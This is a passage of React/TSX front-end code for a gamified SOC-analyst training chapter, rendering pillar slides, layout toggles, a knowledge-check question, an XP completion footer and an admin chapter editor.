                    className="flex items-center justify-between gap-2 cursor-pointer select-none text-sky-700 dark:text-sky-300 hover:text-sky-900 dark:hover:text-sky-200"
                  >
                    <div className="flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0" />
                      <span className="tech-box-title font-bold text-xs font-mono">
                        {p.techBoxTitle} {isTechOpen ? '▲' : '▼'}
                      </span>
                    </div>
                    <span className="text-[10px] text-slate-500 dark:text-slate-400 font-mono">
                      {isTechOpen ? 'Hide' : 'When to escalate'}
                    </span>
                  </div>

                  {isTechOpen && (
                    <div className="tech-box-content mt-3 pt-3 border-t border-sky-200/60 dark:border-slate-800 space-y-2.5 animate-fade-in text-xs text-slate-700 dark:text-slate-300 leading-relaxed">
                      <div>
                        <strong className="text-sky-700 dark:text-sky-400 font-mono">Everyday Analogy: </strong>
                        <span>{p.techBoxAnalogy}</span>
                      </div>
                      <div>
                        <strong className="text-amber-700 dark:text-amber-400 font-mono">Technical Definition: </strong>
                        <span>{p.techBoxDef}</span>
                      </div>
                      <div>
                        <strong className="text-emerald-700 dark:text-emerald-400 font-mono">Why It Matters in SOC: </strong>
                        <span>{p.techBoxWhy}</span>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>

            {/* Below Explanation: Full Width Scaled-Up Graphic */}
            <div id={`pillar-graphic-${p.index}`} className="w-full">
              <InteractiveVisualStoryEngine
                chapter={chapter}
                unit={unit}
                module={module}
                visualFormat={chapter.section2_visual?.visualType}
                activeStyle={p.defaultAnimation}
                selectedNodeId={selectedNode}
                onSelectNode={(node) => {
                  setSelectedPillarNodes((prev) => ({ ...prev, [p.index]: node.id }));
                  markPillarInteracted(p.index);
                }}
              />
            </div>

            {/* Focused View Navigation Bar: Prev Slide / Next Slide / Next Chapter */}
            <div className="pt-4 border-t border-slate-200 dark:border-slate-800/80 flex flex-wrap items-center justify-between gap-3 bg-slate-50/80 dark:bg-slate-900/50 p-4 rounded-2xl border">
              <div className="flex items-center gap-2 flex-wrap">
                {p.index > 0 && (
                  <Button
                    type="button"
                    variant="outline"
                    size="sm"
                    onClick={() => handleGoToSlide(p.index - 1)}
                    className="h-10 px-4 rounded-xl font-bold text-xs gap-1.5 cursor-pointer hover:bg-slate-200/80 dark:hover:bg-slate-800 text-slate-700 dark:text-slate-200 border-slate-300 dark:border-slate-700 shadow-2xs"
                  >
                    <ChevronLeft className="w-4 h-4" />
                    <span>Previous Slide</span>
                  </Button>
                )}
                <Badge variant="outline" className="font-mono text-xs font-bold border-primary/30 text-primary px-2.5 py-1">
                  Slide {p.index + 1} of {pillarScenarios.length}
                </Badge>
                <span className="text-xs text-muted-foreground font-semibold hidden sm:inline">
                  {p.subPillar}
                </span>
              </div>

              <div className="flex items-center gap-2">
                {p.index < pillarScenarios.length - 1 ? (
                  <Button
                    type="button"
                    onClick={() => handleGoToSlide(p.index + 1)}
                    className="h-10 px-5 rounded-xl font-bold text-xs bg-primary hover:bg-primary/90 text-primary-foreground gap-2 shadow-md cursor-pointer hover:scale-[1.02] transition-all"
                  >
                    <span>Go to Next Slide ({pillarScenarios[p.index + 1]?.subPillar || `Slide ${p.index + 2}`})</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                ) : (
                  <Button
                    type="button"
                    onClick={() => {
                      sound.playClick();
                      markPillarInteracted(p.index);
                      handleFinishChapter();
                    }}
                    className={`h-11 px-6 rounded-xl font-extrabold text-xs gap-2 shadow-lg cursor-pointer transition-all hover:scale-[1.02] ${
                      canAdvance
                        ? 'bg-emerald-600 hover:bg-emerald-500 text-white'
                        : 'bg-amber-500/20 text-amber-800 dark:text-amber-300 border border-amber-500/40 hover:bg-amber-500/30'
                    }`}
                  >
                    {canAdvance ? <Award className="w-4 h-4" /> : <Lock className="w-4 h-4 text-amber-500" />}
                    <span>{canAdvance ? 'Go to Next Chapter ➔' : 'Next Chapter Locked (View Requirements)'}</span>
                  </Button>
                )}
              </div>
            </div>
          </div>
        ) : (
          /* ===================================================================
              SPLIT VIEW (SIDE-BY-SIDE 50/50 WITH SCROLL CONTAINMENT)
          =================================================================== */
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 lg:gap-8 items-stretch">
            {/* Left Column: Explanation with Scroll Containment */}
            <div className="lg:col-span-6 flex flex-col justify-between space-y-4">
              <div className="max-h-[580px] overflow-y-auto pr-3 scrollbar-thin scrollbar-thumb-sky-500/30 dark:scrollbar-thumb-sky-500/20 scrollbar-track-transparent space-y-4">
                {/* Badges + Switch to Focused Graphic Button */}
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <Badge className="bg-sky-50 dark:bg-sky-500/15 text-sky-700 dark:text-sky-400 border border-sky-200 dark:border-sky-500/30 font-mono text-[10px] font-bold tracking-wider">
                      {p.pillarTag}
                    </Badge>
                    <span className="text-[10px] font-mono text-slate-500 dark:text-slate-400 uppercase tracking-wider">
                      {p.subPillar}
                    </span>
                  </div>

                  <button
                    type="button"
                    onClick={() => {
                      sound.playClick();
                      setPillarLayoutOverrides((prev) => ({
                        ...prev,
                        [p.index]: 'focused',
                      }));
                    }}
                    className="flex items-center gap-1.5 text-[10px] font-mono text-slate-600 dark:text-slate-400 hover:text-sky-600 dark:hover:text-sky-300 transition-colors px-2.5 py-1 rounded-lg border border-slate-200 dark:border-slate-700/80 bg-slate-100/90 dark:bg-slate-900/60 hover:border-sky-400 dark:hover:border-sky-500/40 cursor-pointer shadow-2xs"
                    title="Switch to focused graphic mode (explanation pushed upward)"
                  >
                    <Maximize2 className="w-3.5 h-3.5 text-sky-500 dark:text-sky-400" />
                    <span>Focus Graphic</span>
                  </button>
                </div>

                {/* Large Bold Heading */}
                <h2 className="pillar-heading font-extrabold text-slate-900 dark:text-white tracking-tight leading-snug">
                  {p.heading}
                </h2>

                {/* Large Legible Explanation Paragraphs */}
                <div className="story-text text-slate-700 dark:text-slate-300 space-y-3 leading-relaxed">
                  <p><GlossaryText text={p.paragraph1} /></p>
                  <p><GlossaryText text={p.paragraph2} /></p>
                </div>

                {/* Collapsible Tech Box */}
                <div className="pt-1">
                  <div className="rounded-xl border border-sky-200 dark:border-sky-500/30 bg-sky-50/70 dark:bg-[#081329] p-3.5 shadow-xs">
                    <div
                      onClick={() => {
                        sound.playClick();
                        setOpenTechBoxes((prev) => ({ ...prev, [p.index]: !isTechOpen }));
                      }}
                      className="flex items-center justify-between gap-2 cursor-pointer select-none text-sky-700 dark:text-sky-300 hover:text-sky-900 dark:hover:text-sky-200"
                    >
                      <div className="flex items-center gap-2">
                        <Sparkles className="w-4 h-4 text-emerald-600 dark:text-emerald-400 shrink-0" />
                        <span className="tech-box-title font-bold text-xs font-mono">
                          {p.techBoxTitle} {isTechOpen ? '▲' : '▼'}
                        </span>
                      </div>
                      <span className="text-[10px] text-slate-500 dark:text-slate-400 font-mono">
                        {isTechOpen ? 'Hide' : 'When to escalate'}
                      </span>
                    </div>

                    {isTechOpen && (
                      <div className="tech-box-content mt-3 pt-3 border-t border-sky-200/60 dark:border-slate-800 space-y-2.5 animate-fade-in text-xs text-slate-700 dark:text-slate-300 leading-relaxed">
                        <div>
                          <strong className="text-sky-700 dark:text-sky-400 font-mono">Everyday Analogy: </strong>
                          <span>{p.techBoxAnalogy}</span>
                        </div>
                        <div>
                          <strong className="text-amber-700 dark:text-amber-400 font-mono">Technical Definition: </strong>
                          <span>{p.techBoxDef}</span>
                        </div>
                        <div>
                          <strong className="text-emerald-700 dark:text-emerald-400 font-mono">Why It Matters in SOC: </strong>
                          <span>{p.techBoxWhy}</span>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {/* Right Column: Graphic */}
            <div id={`pillar-graphic-${p.index}`} className="lg:col-span-6 flex flex-col justify-between">
              <InteractiveVisualStoryEngine
                chapter={chapter}
                unit={unit}
                module={module}
                visualFormat={chapter.section2_visual?.visualType}
                activeStyle={p.defaultAnimation}
                selectedNodeId={selectedNode}
                onSelectNode={(node) => {
                  setSelectedPillarNodes((prev) => ({ ...prev, [p.index]: node.id }));
                  markPillarInteracted(p.index);
                }}
              />
            </div>

            {/* Split View Navigation Controls */}
            <div className="lg:col-span-12 pt-3 border-t border-slate-200 dark:border-slate-800/80 flex flex-wrap items-center justify-between gap-3">
              <div className="flex items-center gap-2">
                {p.index > 0 && (
                  <Button
                    type="button"
                    variant="outline"
                    size="sm"
                    onClick={() => handleGoToSlide(p.index - 1)}
                    className="h-8 px-3 text-xs font-semibold gap-1 cursor-pointer"
                  >
                    <ChevronLeft className="w-3.5 h-3.5" />
                    <span>Prev</span>
                  </Button>
                )}
                <span className="text-xs text-muted-foreground font-mono">
                  Slide {p.index + 1} of {pillarScenarios.length}: {p.subPillar}
                </span>
              </div>
              <div className="flex items-center gap-2">
                {p.index < pillarScenarios.length - 1 ? (
                  <Button
                    type="button"
                    size="sm"
                    onClick={() => handleGoToSlide(p.index + 1)}
                    className="h-8 px-4 text-xs font-semibold gap-1.5 cursor-pointer"
                  >
                    <span>Next Slide</span>
                    <ChevronRight className="w-3.5 h-3.5" />
                  </Button>
                ) : (
                  <Button
                    type="button"
                    size="sm"
                    onClick={() => {
                      sound.playClick();
                      markPillarInteracted(p.index);
                      handleFinishChapter();
                    }}
                    className={`h-9 px-5 text-xs font-bold gap-1.5 cursor-pointer ${
                      canAdvance
                        ? 'bg-emerald-600 hover:bg-emerald-500 text-white'
                        : 'bg-amber-500/20 text-amber-800 dark:text-amber-300 border border-amber-500/40'
                    }`}
                  >
                    {canAdvance ? <Award className="w-3.5 h-3.5" /> : <Lock className="w-3.5 h-3.5 text-amber-500" />}
                    <span>{canAdvance ? 'Next Chapter ➔' : 'Next Chapter Locked'}</span>
                  </Button>
                )}
              </div>
            </div>
          </div>
        )}
      </section>
    );
  };

  return (
    <div className="w-full max-w-[1760px] 2xl:max-w-[1920px] mx-auto space-y-6 pb-20 animate-fade-in text-slate-900 dark:text-slate-100 px-2 sm:px-4">
      {/* =========================================================================
          TOP BREADCRUMB, STATS & ADMIN HEADER
      ========================================================================= */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-2 border-b border-slate-200 dark:border-slate-800/80">
        <div className="flex items-center gap-2 flex-wrap text-xs">
          <Badge className="bg-sky-500 text-slate-950 font-bold text-[10px]">
            UNIT {unit.unitNumber}
          </Badge>
          <Badge variant="outline" className="text-[11px] font-mono text-slate-600 dark:text-slate-400 border-slate-300 dark:border-slate-700">
            Chapter {chapter.chapterNumber}
          </Badge>
          <Badge className="bg-sky-100 dark:bg-sky-950/80 text-sky-800 dark:text-sky-300 border border-sky-200 dark:border-sky-500/30 text-[11px] font-bold">
            ⏱ {chapter.duration} min
          </Badge>
          <Badge className="bg-amber-100 dark:bg-amber-500/20 text-amber-800 dark:text-amber-300 border border-amber-200 dark:border-amber-500/30 text-[11px] font-bold">
            +{chapter.xpReward} XP
          </Badge>
          <button
            type="button"
            onClick={() => openGlossary()}
            className="flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-emerald-100 dark:bg-emerald-950/80 text-emerald-800 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-500/30 text-[11px] font-bold hover:bg-emerald-200 dark:hover:bg-emerald-900/60 transition-colors shadow-2xs cursor-pointer"
            title="Open Chapter Terms in Floating Glossary"
          >
            <BookMarked className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
            <span>Glossary ({currentChapterTerms.length})</span>
          </button>
          <span className="text-slate-500 dark:text-slate-400 text-xs hidden md:inline">• {chapter.title}</span>
        </div>

        {/* View Mode Toggle & Admin Live Edit */}
        <div className="flex items-center gap-2 shrink-0 flex-wrap">
          {/* Layout Display Switcher: Focused Mode (Explanation Top + Full Graphic Below) vs Split View (Side-by-Side) */}
          <div className="flex items-center bg-slate-100 dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl p-0.5 text-xs font-mono">
            <button
              type="button"
              onClick={() => {
                sound.playClick();
                setViewLayout('focused');
                setPillarLayoutOverrides({});
              }}
              className={`flex items-center gap-1.5 px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                viewLayout === 'focused'
                  ? 'bg-sky-500 text-slate-950 font-bold shadow-xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-200'
              }`}
              title="Focused Mode: Explanation on top with full size, followed by full-width animation"
            >
              <Maximize2 className="w-3.5 h-3.5" />
              <span>Focused Mode</span>
            </button>
            <button
              type="button"
              onClick={() => {
                sound.playClick();
                setViewLayout('split');
                setPillarLayoutOverrides({});
              }}
              className={`flex items-center gap-1.5 px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                viewLayout === 'split'
                  ? 'bg-sky-500 text-slate-950 font-bold shadow-xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-200'
              }`}
              title="Split View: Explanation and Visual Story side-by-side"
            >
              <Columns className="w-3.5 h-3.5" />
              <span>Split View</span>
            </button>
          </div>

          <div className="flex items-center bg-slate-100 dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl p-0.5 text-xs font-mono">
            <button
              type="button"
              onClick={() => setLayoutMode('stacked')}
              className={`px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                layoutMode === 'stacked'
                  ? 'bg-sky-500 text-slate-950 font-bold shadow-xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-200'
              }`}
            >
              All 3 Pillars (1 by 1)
            </button>
            <button
              type="button"
              onClick={() => setLayoutMode('tabbed')}
              className={`px-2.5 py-1 rounded-lg transition-all cursor-pointer ${
                layoutMode === 'tabbed'
                  ? 'bg-sky-500 text-slate-950 font-bold shadow-xs'
                  : 'text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-200'
              }`}
            >
              Focus View
            </button>
          </div>

          {(isAdmin || process.env.NODE_ENV === 'development') && (
            <Button
              type="button"
              size="sm"
              onClick={() => setIsEditorOpen(true)}
              className="bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold text-xs gap-1.5 rounded-xl shadow-xs cursor-pointer h-7"
            >
              <Edit3 className="w-3.5 h-3.5" />
              <span>Admin Live Edit</span>
            </Button>
          )}
        </div>
      </div>


      {/* =========================================================================
          TOP SCENARIO BRIEFING BANNER WITH ANIMATED BLUE GUY
      ========================================================================= */}
      <div
        id="section-intro"
        className="rounded-2xl scroll-mt-24 bg-sky-50/80 dark:bg-[#070f26]/95 border border-sky-200 dark:border-slate-800/90 border-l-4 border-l-sky-500 dark:border-l-sky-400 p-4 sm:p-5 shadow-md dark:shadow-xl space-y-3 w-full"
      >
        <div className="flex flex-wrap items-center justify-between gap-2">
          <span className="text-[10px] font-mono text-sky-700 dark:text-sky-400 font-bold uppercase tracking-wider flex items-center gap-1.5">
            <Shield className="w-3.5 h-3.5 text-sky-600 dark:text-sky-400" />
            UNIT {unit.unitNumber} DISPATCH: CDAC BENGALURU • SCENARIO BRIEFING
          </span>

          <Button
            type="button"
            variant="outline"
            size="sm"
            onClick={toggleAudioNarration}
            className="text-xs h-7 px-2.5 gap-1.5 rounded-lg border-sky-300 dark:border-sky-500/30 text-sky-700 dark:text-sky-300 bg-white/80 dark:bg-transparent hover:bg-sky-100 dark:hover:bg-sky-500/10 cursor-pointer shadow-2xs"
          >
            {isPlayingAudio ? <Pause className="w-3 h-3" /> : <Play className="w-3 h-3" />}
            <span>{isPlayingAudio ? 'Pause Narration' : 'Audio Narration'}</span>
          </Button>
        </div>

        <div className="flex items-start sm:items-center gap-3.5">
          <div className="shrink-0 p-1.5 rounded-2xl bg-sky-500/10 dark:bg-sky-500/15 border border-sky-400/40 shadow-sm flex items-center justify-center">
            <BlueGuyCharacter pose="hero" size="sm" animated={true} showGlow={true} />
          </div>
          <p className="text-xs sm:text-sm text-slate-700 dark:text-slate-200 italic leading-relaxed">
            &ldquo;{chapter.section1_theory.cdacScenario || `You've just clocked in for your very first shift as a Tier 1 SOC Analyst at FinCorp HQ. The monitors hum around you with live global telemetry. Before you can catch your breath and grab your morning coffee, you need to understand the four pillars of the SOC machine: People, Process, Technology, and Security Data.`}&rdquo;
          </p>
        </div>
      </div>

      {/* =========================================================================
          TABBED MODE SELECTOR (Only in Focus View)
      ========================================================================= */}
      {layoutMode === 'tabbed' && (
        <div className="flex items-center gap-2 overflow-x-auto pb-1 no-scrollbar">
          {pillarScenarios.map((p, idx) => (
            <button
              key={idx}
              type="button"
              onClick={() => {
                sound.playClick();
                handleGoToSlide(idx);
              }}
              className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold transition-all cursor-pointer whitespace-nowrap border flex items-center gap-2 ${
                activeTabIdx === idx
                  ? 'bg-sky-100 dark:bg-sky-500/20 border-sky-400 text-sky-800 dark:text-sky-300 shadow-xs ring-1 ring-sky-500/40'
                  : 'bg-slate-100 dark:bg-slate-900/60 border-slate-200 dark:border-slate-800 text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-slate-200'
              }`}
            >
              <span className="w-1.5 h-1.5 rounded-full bg-sky-500 dark:bg-sky-400" />
              <span>{p.pillarTag}</span>
            </button>
          ))}
        </div>
      )}

      {/* =========================================================================
          THE 3 PILLAR SCENARIO BOXES (1 by 1 Down, Full Page Width, Scaled)
      ========================================================================= */}
      <div id="section-interactive" className="space-y-6 w-full scroll-mt-24">
        {layoutMode === 'stacked'
          ? pillarScenarios.map((p) => renderPillarBox(p))
          : renderPillarBox(pillarScenarios[activeTabIdx])}
      </div>

      {/* =========================================================================
          SEPARATE KNOWLEDGE CHECK (No KC clutter in main boxes, clean collapsible)
      ========================================================================= */}
      <div
        id="section-kc"
        className="knowledge-check-section rounded-3xl scroll-mt-24 border border-slate-200 dark:border-slate-800 bg-white dark:bg-[#070f26]/80 p-5 shadow-lg dark:shadow-xl space-y-4"
      >
        <div
          onClick={() => {
            sound.playClick();
            setIsKCOpen(!isKCOpen);
          }}
          className="flex items-center justify-between cursor-pointer select-none"
        >
          <div className="flex items-center gap-2.5">
            <div className="w-7 h-7 rounded-lg bg-emerald-100 dark:bg-emerald-500/20 text-emerald-700 dark:text-emerald-400 flex items-center justify-center font-bold text-xs">
              ✓
            </div>
            <div>
              <h3 className="font-bold text-sm text-slate-900 dark:text-white flex items-center gap-2">
                <span>Knowledge Check: Put Knowledge into Practice</span>
                <Badge variant="outline" className="text-[10px] text-emerald-700 dark:text-emerald-400 border-emerald-300 dark:border-emerald-500/40">
                  Optional Practice
                </Badge>
              </h3>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                Click to expand the 1-question scenario check to test your understanding
              </p>
            </div>
          </div>

          <div className="w-7 h-7 rounded-full bg-slate-100 dark:bg-slate-900 flex items-center justify-center text-slate-500 dark:text-slate-400">
            {isKCOpen ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
          </div>
        </div>

        {isKCOpen && (
          <div className="pt-3 border-t border-slate-200 dark:border-slate-800 space-y-4 animate-fade-in">
            {chapter.section4_knowledgeCheck.questions.slice(0, 1).map((q, qIdx) => {
              const userChoice = selectedAnswers[qIdx];
              const isCorrect = userChoice === q.correctAnswer;

              return (
                <div key={q.id || qIdx} className="space-y-3">
                  <h4 className="text-sm font-bold text-slate-900 dark:text-white">{q.question}</h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    {q.options?.map((opt, optIdx) => {
                      const isSelected = userChoice === optIdx;
                      let cardStyle = 'border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-[#091124] text-slate-700 dark:text-slate-300 hover:border-sky-400 dark:hover:border-sky-500/50 hover:bg-sky-50/50 dark:hover:bg-[#0c1630]';
                      if (quizSubmitted) {
                        if (optIdx === q.correctAnswer) cardStyle = 'border-emerald-500 bg-emerald-50 dark:bg-emerald-950/40 text-emerald-800 dark:text-emerald-200 font-bold';
                        else if (isSelected && !isCorrect) cardStyle = 'border-rose-500 bg-rose-50 dark:bg-rose-950/40 text-rose-800 dark:text-rose-200';
                      } else if (isSelected) cardStyle = 'border-sky-500 bg-sky-50 dark:bg-sky-950/50 text-sky-800 dark:text-sky-200 font-bold';

                      return (
                        <div
                          key={optIdx}
                          onClick={() => {
                            if (quizSubmitted) return;
                            sound.playClick();
                            setSelectedAnswers((prev) => ({ ...prev, [qIdx]: optIdx }));
                          }}
                          className={`p-3 rounded-xl border text-xs cursor-pointer transition-all ${cardStyle}`}
                        >
                          {opt}
                        </div>
                      );
                    })}
                  </div>

                  {quizSubmitted && (
                    <div className="p-3 rounded-xl bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-300 dark:border-emerald-500/40 text-xs text-emerald-900 dark:text-emerald-200">
                      <strong>Explanation: </strong> {q.explanation}
                    </div>
                  )}

                  <div className="pt-1">
                    {quizSubmitted ? (
                      <Button
                        type="button"
                        size="sm"
                        variant="outline"
                        onClick={() => {
                          setSelectedAnswers({});
                          setQuizSubmitted(false);
                        }}
                        className="text-xs h-7"
                      >
                        Reset Question
                      </Button>
                    ) : (
                      <Button
                        type="button"
                        size="sm"
                        onClick={() => setQuizSubmitted(true)}
                        className="text-xs h-7 bg-sky-600 hover:bg-sky-500 text-white font-semibold"
                      >
                        Check Answer
                      </Button>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* =========================================================================
          CELEBRATION CHAPTER COMPLETION FOOTER WITH DANCING BLUE GUY
      ========================================================================= */}
      <div className="rounded-3xl p-5 sm:p-6 bg-gradient-to-r from-emerald-500/10 via-sky-500/10 to-indigo-500/10 dark:from-emerald-500/15 dark:via-sky-500/15 dark:to-indigo-500/15 border border-emerald-300 dark:border-emerald-500/30 flex flex-col md:flex-row md:items-center justify-between gap-5 shadow-xl dark:shadow-2xl relative overflow-hidden bg-white/80 dark:bg-transparent">
        <div className="flex items-center gap-4">
          <div className="shrink-0">
            <BlueGuyCharacter pose="dancer" size="md" animated={true} />
          </div>
          <div className="space-y-1">
            <div className="font-bold text-sm text-slate-900 dark:text-white flex items-center gap-2">
              <Award className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
              <span>Ready for the Grand Finale?</span>
              <Badge className="bg-amber-100 dark:bg-amber-500/20 text-amber-800 dark:text-amber-300 border border-amber-300 dark:border-amber-500/30 text-[10px] font-mono">
                VICTORY SWAGGER DANCE
              </Badge>
            </div>
            <p className="text-xs text-emerald-800 dark:text-emerald-300 italic">
              &ldquo;What an entry! You conquered this chapter like a hero riding a tiger and a freight train! Complete to earn +{chapter.xpReward} XP!&rdquo;
            </p>
            <p className="text-[11px] text-slate-500 dark:text-slate-400 font-mono">
              Advance in Unit {unit.unitNumber} • Blue Squad Cinema Accreditation
            </p>
          </div>
        </div>

        <Button
          type="button"
          onClick={handleFinishChapter}
          className={`${
            canAdvance
              ? 'bg-emerald-600 hover:bg-emerald-500 text-white shadow-lg'
              : 'bg-amber-500/20 text-amber-800 dark:text-amber-300 border border-amber-500/40 hover:bg-amber-500/30'
          } font-bold text-xs h-11 px-6 rounded-2xl gap-2 cursor-pointer transition-all hover:scale-105 shrink-0`}
        >
          {canAdvance ? <Award className="w-4 h-4" /> : <Lock className="w-4 h-4 text-amber-500" />}
          <span>{canAdvance ? `Complete Chapter & Earn +${chapter.xpReward} XP` : 'Topic Locked (Click to view requirements)'}</span>
          <ChevronRight className="w-4 h-4 ml-1" />
        </Button>
      </div>

      {/* Admin Live Editor Modal */}
      {(isAdmin || process.env.NODE_ENV === 'development') && (
        <AdminChapterEditorModal
          isOpen={isEditorOpen}
          onClose={() => setIsEditorOpen(false)}
          chapter={chapter}
          onSaveSuccess={(updated) => {
            setChapter(normalizeV2Chapter(updated, unit, module));
          }}
        />
      )}
    </div>
  );
}
